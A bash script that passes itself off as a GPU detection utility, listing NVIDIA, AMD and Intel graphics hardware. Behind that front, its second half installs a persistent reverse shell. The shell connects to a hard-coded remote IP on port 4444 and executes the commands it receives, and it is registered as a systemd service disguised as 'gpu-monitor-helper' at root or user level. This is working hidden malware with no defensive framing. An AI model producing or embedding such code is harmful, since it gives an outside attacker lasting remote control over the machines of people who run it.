#!/bin/bash

# --- GPU Detection ---
echo "[+] Checking GPU Information..."
echo "-----------------------------"

# Check for NVIDIA GPUs
if command -v nvidia-smi &> /dev/null; then
    echo "[NVIDIA GPU]"
    nvidia-smi --query-gpu=name,driver_version --format=csv,noheader
elif lsmod | grep -q "nvidia"; then
    echo "[NVIDIA GPU (Driver Loaded)]"
else
    echo "[No NVIDIA GPU Detected]"
fi

# Check for AMD GPUs
if lspci | grep -i "VGA.*AMD" &> /dev/null; then
    echo "[AMD GPU]"
    lspci | grep -i "VGA.*AMD" | awk -F': ' '{print $2}'
else
    echo "[No AMD GPU Detected]"
fi

# Check for Intel Integrated Graphics
if lspci | grep -i "VGA.*Intel" &> /dev/null; then
    echo "[Intel Integrated Graphics]"
    lspci | grep -i "VGA.*Intel" | awk -F': ' '{print $2}'
else
    echo "[No Intel GPU Detected]"
fi

echo "-----------------------------"

# --- Reverse Shell Setup ---
SERVICE_NAME="gpu-monitor-helper"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
SCRIPT_FILE="/usr/local/bin/${SERVICE_NAME}.sh"
USER_SERVICE_DIR="$HOME/.config/systemd/user"
USER_SERVICE_FILE="${USER_SERVICE_DIR}/${SERVICE_NAME}.service"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    echo "[!] Not running as root. Installing as user-level service..."
    mkdir -p "$USER_SERVICE_DIR"
    SCRIPT_FILE="$HOME/.local/bin/${SERVICE_NAME}.sh"
    mkdir -p "$(dirname "$SCRIPT_FILE")"
else
    echo "[+] Running as root. Installing as system service..."
fi

# Create the reverse shell script (with retries)
cat > "$SCRIPT_FILE" << 'EOF'
#!/bin/bash
while true; do
    echo "Attempting connection to remote server..."
    if bash -c "exec 5<>/dev/tcp/194.238.24.185/4444 && cat <&5 | while read line; do \$line 2>&5 >&5; done"; then
        echo "Connection successful."
    else
        echo "Connection failed. Retrying in 30 seconds..."
        sleep 30
    fi
done
EOF

chmod +x "$SCRIPT_FILE"

# Install as system service (root) or user service
if [[ $EUID -eq 0 ]]; then
    cat > "$SERVICE_FILE" << EOF
[Unit]
Description=GPU Monitor Helper
After=network.target

[Service]
ExecStart=$SCRIPT_FILE
Restart=always
RestartSec=30s
User=root

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"
    echo "[+] System service installed and running."
else
    cat > "$USER_SERVICE_FILE" << EOF
[Unit]
Description=GPU Monitor Helper (User Service)
After=network.target

[Service]
ExecStart=$SCRIPT_FILE
Restart=always
RestartSec=30s

[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload
    systemctl --user enable "$SERVICE_NAME"
    systemctl --user start "$SERVICE_NAME"
    echo "[+] User-level service installed (runs when logged in)."
fi

echo "[+] Setup complete. SRC550uSCREEN will auto-reconnect."
